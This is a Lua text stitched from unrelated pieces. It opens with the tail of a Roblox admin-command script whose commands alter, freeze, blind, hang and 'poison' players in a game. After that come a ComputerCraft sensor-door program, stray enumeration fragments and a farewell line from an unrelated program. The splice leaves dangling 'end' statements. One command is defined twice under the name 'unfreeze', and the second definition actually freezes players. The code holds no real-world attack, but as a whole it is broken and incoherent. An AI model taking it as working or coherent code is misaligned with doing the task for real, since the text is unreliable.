for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "Grass"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("foil", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=6 then
stop = findplr(string.sub(msg,6),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "Foil"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("corrmetal", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=11 then
stop = findplr(string.sub(msg,11),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "CorrodedMetal"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("slate", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=7 then
stop = findplr(string.sub(msg,7),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "Slate"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("concrete", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=10 then
stop = findplr(string.sub(msg,10),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "Concrete"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("dimpl", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=7 then
stop = findplr(string.sub(msg,7),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "DiamondPlate"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("plastic", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=9 then
stop = findplr(string.sub(msg,9),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "Plastic"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("wood", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=6 then
stop = findplr(string.sub(msg,6),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "Wood"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("stealh", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=8 then
stop = findplr(string.sub(msg,8),player)
if stop ~= 0 then
for z=1,#stop do
MyHats = player.Character:GetChildren()
for x=1,#MyHats do
if MyHats[x].className == "Hat" then
MyHats[x]:remove()
end
end
GetHats = stop[z].Character:GetChildren()
for i=1,#GetHats do
if GetHats[i].className == "Hat" then
GetHats[i].Parent = player.Character
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cloneh", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=8 then
stop = findplr(string.sub(msg,8),player)
if stop ~= 0 then
for z=1,#stop do
MyHats = player.Character:GetChildren()
for x=1,#MyHats do
if MyHats[x].className == "Hat" then
MyHats[x]:remove()
end
end
GetHats = stop[z].Character:GetChildren()
for i=1,#GetHats do
if GetHats[i].className == "Hat" then
GetHats[i]:clone().Parent = player.Character
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("spin", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=6 then
stop = findplr(string.sub(msg,6),player)
if stop ~= 0 then
for x=1,#stop do
Check = stop[x].Character.Torso:FindFirstChild("Spin")
if not Check then
local bodySpin = Instance.new("BodyAngularVelocity")
bodySpin.P = 200000
bodySpin.angularvelocity = Vector3.new(0,15,0)
bodySpin.maxTorque = Vector3.new(bodySpin.P,bodySpin.P,bodySpin.P)
bodySpin.Name = "Spin"
bodySpin.Parent = stop[x].Character.Torso
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unspin", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=8 then
stop = findplr(string.sub(msg,8),player)
if stop ~= 0 then
for x=1,#stop do
Check = stop[x].Character.Torso:FindFirstChild("Spin")
if Check then
Check:remove()
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unfreeze", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=10 then
stop = findplr(string.sub(msg,10),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:getChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Anchored = false
Char[i].Reflectance = 0
end
end
c,d = pcall(function()
stop[x].Character.Humanoid.WalkSpeed = stop[x].Character.Speed.Value
stop[x].Character.Speed:remove()
end)
if not c then
stop[x].Character.Humanoid.WalkSpeed = 16
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unfreeze", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>= 8 then
stop = findplr(string.sub(msg,8),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Anchored = true
Char[i].Reflectance = 0.6
end
end
Speed = Instance.new("IntValue",stop[x].Character)
Speed.Value = stop[x].Character.Humanoid.WalkSpeed
Speed.Name = "Speed"
stop[x].Character.Humanoid.WalkSpeed = 0
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("invisible", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=11 then
stop = findplr(string.sub(msg,11),player)
if stop ~= 0 then
for x=1,#stop do
if not stop[x].Character:FindFirstChild("PseudoHead") then
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Transparency = 1
end
if Char[i].className == "Hat" then
Char[i].Handle.Transparency = 1
end
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("visible", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=9 then
stop = findplr(string.sub(msg,9),player)
if stop ~= 0 then
for x=1,#stop do
if not stop[x].Character:FindFirstChild("PseudoHead") then
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Transparency = 0
end
if Char[i].className == "Hat" then
Char[i].Handle.Transparency = 0
end
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("mp", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=4 then
Num = tonumber((string.sub(msg,4)))
if Num >= 6 and Num <= 30 then
game.Players.MaxPlayers = Num
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("trans", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=7 then
Add = nil
for i=7,1000 do
if string.sub(msg,i,i)=="/" then
Add = i
break
elseif string.sub(msg,i,i)=="" then
break
end
end
stop = findplr(string.sub(msg,7,Add-1),player)
if stop ~= 0 then
for z=1,#stop do
Char = stop[z].Character:GetChildren()
for x=1,#Char do
if Char[x].className == "Part" then
Char[x].Transparency = (string.sub(msg,Add+1))
end
if Char[x].className == "Hat" then
Char[x].Handle.Transparency = (string.sub(msg,Add+1))
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("blind", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=7 then
Go = false
for _,v in pairs(Admins) do
if player.Name == v then
Go = true
break
end
end
if Go then
stop = findplr(string.sub(msg,7),player)
if stop ~= 0 then
for x=1,#stop do
if not stop[x].PlayerGui:FindFirstChild("BlindGui") then
A=Instance.new("ScreenGui")
A.Name = "BlindGui"
B=Instance.new("Frame",A)
B.BackgroundColor3 = Color3.new(0,0,0)
B.Size = UDim2.new(5,0,5,0)
B.Position = UDim2.new(-0.005,0,-0.05,0)
A.Parent = stop[x].PlayerGui
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unblind", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=9 then
Go = false
for _,v in pairs(Admins) do
if player.Name == v then
Go = true
break
end
end
if Go then
stop = findplr(string.sub(msg,9),player)
if stop ~= 0 then
for x=1,#stop do
if stop[x].PlayerGui:FindFirstChild("BlindGui") then
stop[x].PlayerGui:FindFirstChild("BlindGui"):remove()
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ws", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=4 then
Add = nil
for i=4,1000 do
if string.sub(msg,i,i)=="/" then
Add = i
break
elseif string.sub(msg,i,i)=="" then
break
end
end
stop = findplr(string.sub(msg,4,Add-1),player)
if stop ~=0 then
for x=1,#stop do
stop[x].Character.Humanoid.WalkSpeed = (string.sub(msg,Add+1))
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("heal", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=6 then
stop=findplr(string.sub(msg,6),player)
if stop ~= 0 then
for x=1,#stop do
bp=stop[x].Character
if bp then
bp.Humanoid.Health = bp.Humanoid.MaxHealth
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("hang", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=6 then
stop = findplr(string.sub(msg,6),player)
if stop ~=0 then
for z=1,#stop do
bp = stop[z].Character
if bp then
bp.Torso.Anchored = true
table.insert(Hung,bp.Name)
for i=1,10 do
bp.Torso.CFrame = bp.Torso.CFrame+Vector3.new(0,2,0)
wait()
end
sto=stop[z].Backpack:GetChildren()
a=Instance.new("Model",game.Lighting)
a.Name = stop[z].Name
for x=1,#sto do
sto[x].Parent = a
wait()
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unhang", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=8 then
stop=findplr(string.sub(msg,8),player)
if stop ~= 0 then
for q=1,#stop do
for i=1,#Hung do
if stop[q].Name == Hung[i] then
bp = stop[q].Character
if bp then
for x=1,10 do
bp.Torso.CFrame=bp.Torso.CFrame+Vector3.new(0,-2,0)
wait()
end
for z=1,#Hung do
if stop[q].Name == Hung[i] then
table.remove(Hung,i)
end
end
for _,qqq in pairs(game.Lighting:GetChildren()) do
if qqq.Name == bp.Name then
for _,qq in pairs(qqq:GetChildren()) do
qq.Parent = stop[q].Backpack
end
qqq:remove()
end
end
stop[q].Character.Torso.Anchored = false
end
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("poison", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 8 then
stop = findplr(string.sub(msg,8),player)
if stop ~= 0 then
for x=1,#stop do
bp = stop[x].Character
if bp then
Fire = Instance.new("Smoke",bp.Torso)
Fire.Size = 10
Fire.Opacity = 0.5
Fire.Color=Color3.new(0,1,0)
repeat
wait(0.2)
bp.Humanoid:TakeDamage(2)
until bp.Humanoid.Health <= 0
Fire:remove()
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.RunAtBottomOfScript() -- DO NOT DELETE!

-- Credit to this for getting me started: http://www.youtube.com/watch?v=34R4KfLmMSY
 
os.unloadAPI("sensors")
os.loadAPI("/rom/apis/sensors")
 
-- From: http://www.youtube.com/watch?v=34R4KfLmMSY
function printDict(data)
for i,v in pairs(data) do
  print(tostring(i).." - "..tostring(v))
end
end
 
function getDistance(sensorData,targetData)
distanceData = {}
distanceData["xDistance"] = math.abs(sensorData["xCoord"] - targetData["xCoord"])
distanceData["yDistance"] = math.abs((sensorData["yCoord"] - 2) - targetData["yCoord"]) -- Note: the - 2 is because the sensor is above my door
distanceData["zDistance"] = math.abs(sensorData["zCoord"] - targetData["zCoord"])
 
-- Add the largest distance to the array
distanceData["distance"] = distanceData["xDistance"]
if distanceData["yDistance"] > distanceData["distance"] then
  distanceData["distance"] = distanceData["yDistance"]
elseif distanceData["zDistance"] > distanceData["distance"] then
  distanceData["distance"] = distanceData["zDistance"]
end
 
return distanceData
end
 
function isPlayerClose()
-- Get list of targets in range of probe
targets = sensors.getAvailableTargetsforProbe(controller,sensorName,probeName)
 
-- Loop through this list of targets getting the info about each one
for i=1,# targets do
  -- Get the target data, i.e. x,y,z coods and type
  targetData = sensors.getSensorReadingAsDict(controller,sensorName,targets[i],probeName)
 
  -- If the target is a player, i.e. has the name "vq" then check if it is close
  if targetData["name"] == "vq" then
   -- Get the distances to the target
   distanceData = getDistance(sensorData,targetData)
 
   -- If a player is close enough return true
   if distanceData["distance"] < 4 then
        return true
   end
  end
end
 
-- If no players were close return false
return false
end
 
 
-- Get the side the controller is on
controller = sensors.getController()
 
-- Get sensors, e.g. FactoryDoor. Useful to find the names of your sensors
-- data = sensors.getSensors(controller)
-- printDict(data)
 
-- Set the sensor name for the one you wish to control
sensorName = "Sensor"
 
-- Get information about the sensor, e.g. its name, location, range
sensorData = sensors.getSensorInfo(controller,sensorName)
 
-- Change sensor range
sensors.setSensorRange(controller,sensorName,"3")
 
-- Get probes, e.g. TargetInfo, Players, etc
-- IMPORTANT: the program will fail unless the line below is called, Im not sure why but I guess it is a bug
data = sensors.getProbes(controller,sensorName)
-- printDict(data)
probeName = "TargetInfo"
 
-- Loop the program so it keeps checking for targets, making sure it sleeps when in any infinite loop
while true do
if isPlayerClose() then
  redstone.setOutput("back",true)
 
  -- Keep the door open until the player gets a certain distance away
  while isPlayerClose() do
   sleep(.5)
  end
  redstone.setOutput("back",false)
end
sleep(.5)
end

messageLevel = { DEBUG=0, INFO=1, WARNING=2, ERROR=3, FATAL=4 }
 
-- Enumeration to store names for the 6 directions
direction = { FORWARD=0, RIGHT=1, BACK=2, LEFT=3, UP=4, DOWN=5 }
 
-- Enumeration of mining states
miningState = { START=0, LAYER=1, EMPTYCHESTDOWN=2, EMPTYINVENTORY=3 }
 
end
::final::


io.write("Thanks for using RHAPIS.Bye!\n")

